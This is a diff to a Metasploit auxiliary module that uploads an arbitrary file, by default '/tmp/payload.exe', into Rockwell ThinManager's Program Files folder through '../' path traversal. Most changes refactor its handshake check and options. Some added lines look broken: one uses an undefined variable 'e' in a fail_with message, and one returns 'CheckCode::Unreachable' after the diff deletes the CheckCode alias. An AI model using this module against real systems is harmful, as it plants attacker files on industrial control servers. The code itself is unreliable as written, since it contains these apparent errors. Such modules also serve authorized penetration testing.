@@ -7,7 +7,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   prepend Msf::Exploit::Remote::AutoCheck
-  CheckCode = Exploit::CheckCode
 
   def initialize(info = {})
     super(
@@ -44,7 +43,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('LFILE', [false, 'The local file to transfer to the remote system.', '/tmp/payload.exe']),
+        OptPath.new('LFILE', [false, 'The local file to transfer to the remote system.', '/tmp/payload.exe']),
         OptString.new('RFILE', [false, 'The file path to store the file on the remote system.', '/Program Files/Rockwell Software/ThinManager/payload.exe']),
         OptInt.new('DEPTH', [ true, 'The traversal depth. The FILE path will be prepended with ../ * DEPTH', 7 ])
       ]
@@ -54,8 +53,9 @@ class MetasploitModule < Msf::Auxiliary
   def check
     begin
       connect
-    rescue Rex::ConnectionTimeout => e
-      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
+    rescue Rex::ConnectionTimeout
+      print_error("Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed.")
+      return CheckCode::Unreachable
     end
 
     vprint_status('Sending handshake...')
@@ -66,11 +66,11 @@ class MetasploitModule < Msf::Auxiliary
     res = sock.get_once(4096, 5)
     expected_header = "\x00\x04\x00\x01\x00\x00\x00\x08".b
 
-    if res && res.start_with?(expected_header)
+    if res&.start_with?(expected_header)
       vprint_status('Received handshake response.')
       vprint_status(Rex::Text.to_hex_dump(res))
       disconnect
-      return CheckCode::Detected
+      return Exploit::CheckCode::Detected
     elsif res
       vprint_status('Received unexpected handshake response:')
       vprint_status(Rex::Text.to_hex_dump(res))
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Safe
     else
       disconnect
-      returnExploit::CheckCode::Unknown('No handshake response received.')
+      return Exploit::CheckCode::Unknown('No handshake response received.')
     end
   end
 
@@ -106,6 +106,7 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status(Rex::Text.to_hex_dump(res))
     else
       print_error('No handshake response received.')
+      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
     end
 
     lfile = datastore['LFILE']
